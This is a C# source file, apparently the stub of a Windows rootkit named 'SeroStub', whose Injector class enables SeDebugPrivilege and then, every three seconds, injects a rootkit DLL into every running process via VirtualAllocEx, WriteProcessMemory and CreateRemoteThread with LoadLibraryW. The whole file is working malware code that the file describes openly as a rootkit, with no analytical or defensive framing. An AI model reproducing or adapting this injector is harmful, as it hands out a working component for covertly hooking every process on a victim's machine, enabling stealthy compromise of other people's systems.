using System.Runtime.InteropServices;
using System.Text;

namespace SeroStub;

/// <summary>
/// Continuously injects the rootkit DLL into all running processes
/// using CreateRemoteThread + LoadLibraryW so Detours hooks apply everywhere.
/// Uses only P/Invoke (no System.Diagnostics.Process) for NativeAOT compatibility.
/// </summary>
internal static partial class Injector
{
    // ---- Toolhelp32 snapshot ----
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private unsafe struct PROCESSENTRY32W
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public nint th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        public fixed char szExeFile[260];
    }

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool Process32FirstW(nint hSnapshot, ref PROCESSENTRY32W lppe);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool Process32NextW(nint hSnapshot, ref PROCESSENTRY32W lppe);

    // ---- Process manipulation ----
    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint VirtualAllocEx(nint hProcess, nint lpAddress, nuint dwSize, uint flAllocationType, uint flProtect);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool WriteProcessMemory(nint hProcess, nint lpBaseAddress, byte[] lpBuffer, nuint nSize, out nuint lpNumberOfBytesWritten);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint CreateRemoteThread(nint hProcess, nint lpThreadAttributes, nuint dwStackSize, nint lpStartAddress, nint lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [LibraryImport("kernel32.dll")]
    private static partial nint GetModuleHandleW([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf8)]
    private static partial nint GetProcAddress(nint hModule, string lpProcName);

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool CloseHandle(nint hObject);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial uint WaitForSingleObject(nint hHandle, uint dwMilliseconds);

    [LibraryImport("kernel32.dll")]
    private static partial uint GetCurrentProcessId();

    // ---- Privilege escalation ----
    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool OpenProcessToken(nint ProcessHandle, uint DesiredAccess, out nint TokenHandle);

    [LibraryImport("advapi32.dll", SetLastError = true, StringMarshalling = StringMarshalling.Utf16)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool LookupPrivilegeValueW(string? lpSystemName, string lpName, out long lpLuid);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AdjustTokenPrivileges(nint TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, nint PreviousState, nint ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }

    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_QUERY = 0x0008;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    private static void EnableDebugPrivilege()
    {
        if (!OpenProcessToken((nint)(-1), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out nint token))
            return;
        if (LookupPrivilegeValueW(null, "SeDebugPrivilege", out long luid))
        {
            var tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
            AdjustTokenPrivileges(token, false, ref tp, 0, 0, 0);
        }
        CloseHandle(token);
    }

    const uint TH32CS_SNAPPROCESS = 0x00000002;
    const uint PROCESS_CREATE_THREAD = 0x0002;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint INJECT_ACCESS = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;

    private static readonly HashSet<uint> _injectedPids = new();
    private static string _dllPath = "";
    private static nint _loadLibAddr;

    public static void Start(string dllPath)
    {
        _dllPath = dllPath;

        // Cache LoadLibraryW address (same across all processes due to ASLR base for kernel32)
        nint kernel32 = GetModuleHandleW("kernel32.dll");
        _loadLibAddr = GetProcAddress(kernel32, "LoadLibraryW");

        var thread = new Thread(InjectionLoop)
        {
            IsBackground = true,
            Priority = ThreadPriority.BelowNormal
        };
        thread.Start();
    }

    private static void InjectionLoop()
    {
        uint myPid = GetCurrentProcessId();
        _injectedPids.Add(myPid);
        _injectedPids.Add(0);
        _injectedPids.Add(4); // System

        // Try to enable SeDebugPrivilege (works if admin, fails silently otherwise)
        EnableDebugPrivilege();

        while (true)
        {
            try
            {
                nint snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap != -1 && snap != 0)
                {
                    var entry = new PROCESSENTRY32W();
                    unsafe { entry.dwSize = (uint)sizeof(PROCESSENTRY32W); }
                    if (Process32FirstW(snap, ref entry))
                    {
                        do
                        {
                            uint pid = entry.th32ProcessID;
                            if (!_injectedPids.Contains(pid))
                            {
                                if (InjectDll(pid))
                                    _injectedPids.Add(pid); // Only mark as done if injection succeeded
                            }
                        } while (Process32NextW(snap, ref entry));
                    }
                    CloseHandle(snap);
                }
            }
            catch { }

            Thread.Sleep(3000);
        }
    }

    private static bool InjectDll(uint pid)
    {
        if (_loadLibAddr == 0) return false;

        nint hProcess = OpenProcess(INJECT_ACCESS, false, pid);
        if (hProcess == 0) return false;

        try
        {
            byte[] dllBytes = Encoding.Unicode.GetBytes(_dllPath + "\0");
            nuint size = (nuint)dllBytes.Length;

            nint remoteMem = VirtualAllocEx(hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (remoteMem == 0) return false;

            if (!WriteProcessMemory(hProcess, remoteMem, dllBytes, size, out _))
                return false;

            nint hThread = CreateRemoteThread(hProcess, 0, 0, _loadLibAddr, remoteMem, 0, out _);
            if (hThread == 0) return false;

            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            return true;
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }
}
